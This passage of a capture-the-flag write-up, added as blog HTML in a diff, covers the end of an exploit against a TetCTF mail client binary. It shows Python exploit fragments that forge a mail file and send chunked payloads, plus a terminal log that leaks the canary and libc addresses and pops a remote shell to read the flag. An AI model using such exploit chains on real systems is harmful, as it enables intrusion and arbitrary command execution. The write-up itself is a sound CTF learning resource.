+    <span class="n">chunks</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">to_add</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">200</span><span class="p">])</span>
+
+<span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">chunks</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+    <span class="n">send_event</span><span class="p">(</span><span class="n">build_packet</span><span class="p">(</span><span class="sa">b</span><span class="s">"ATF"</span><span class="p">,</span> <span class="n">chunk</span><span class="p">))</span>
+
+<span class="n">mail_file</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">filname</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>I put it in chunks of 200 for extra safety, remembering that the chunks need to be added in reverse order. Finally, I forge a mail file where the content is in whatever path I leaked. All that remains is to read the email and a shell will be popped!</p>
+
+<p>They hinted that the flag filename will be weird as file read primitive is not enough so asterisk is needed.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"cd /home/mailclient"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"cat flag*"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/CTFs/tet/mail/user_build]
+└─$ python3.10 exploit.py REMOTE
+[*] '/home/kali/CTFs/tet/mail/user_build/mailclient'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] '/home/kali/CTFs/tet/mail/user_build/lib/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 139.162.36.205 on port 1337: Done
+[+] Leaks suceeded
+[*] Canary: 0x1d5f307b787f8c00
+[*] Binary base: 0x5590c0c00000
+[*] Libc base: 0x7feaecc9a000
+[*] Loaded 218 cached gadgets for './lib/libc.so.6'
+[+] Leaked filename: /tmp/mail/content/6bMH5uabHh1GNIoc
+[*] Switching to interactive mode
+TetCTF{2b15f22179fc01196b2e673764e45a7f}
+$ ls
+flag_e6db1baa29d3df1eb307ff6a12c778da
+mailclient
+$ id
+uid=1000(mailclient) gid=1000(mailclient) groups=1000(mailclient)
+$ whoami
+mailclient
+$ 
+[*] Interrupted
+[*] Closed connection to 139.162.36.205 port 1337
+</code></pre></div></div>
+
+<p>Full exploit <a href="https://github.com/Day91/Writeups/blob/master/TetCTF/exploit.py">here</a></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>That was a very refreshing challenge and definitely very unique. While it was more logic based and less memory corruption based, I think that was a nice difference and not something you usually see in CTFs. It was very distinctive without being toxic or extremely knowledge-based which isn’t very regular in CTFs nowadays, so I thank <a href="https://twitter.com/chung96vn">@chung96pwn</a> for the challenge!</p>
+
+
+</article>
+
+
+
+<div class="post-pagination">
+  
+    <a class="post-pagination-item left" href="/pwn/2022/10/07/SekaiCTF-2022-BFS.html">
+      <i class="fas fa-chevron-left"></i> <span class="post-pagination-title">SekaiCTF 2022: BFS
+</span>
+    </a>
+  
+  
+  
+    <span class="post-pagination-item right"></span>
+  
+</div>
+
+        </main>
+
+        <footer class="footer">
+          <small>
+            &copy; <time datetime="2023-01-02T23:53:03+00:00">2023</time>&nbsp;<a href="" target="_blank">Day91</a>. All rights reserved.
+          </small>
+        </footer>
+      </div>
+    </div>
+
+    <label for="sidebar-checkbox" class="sidebar-toggle"></label>
+
+    
+
+    
+  </body>
+</html>
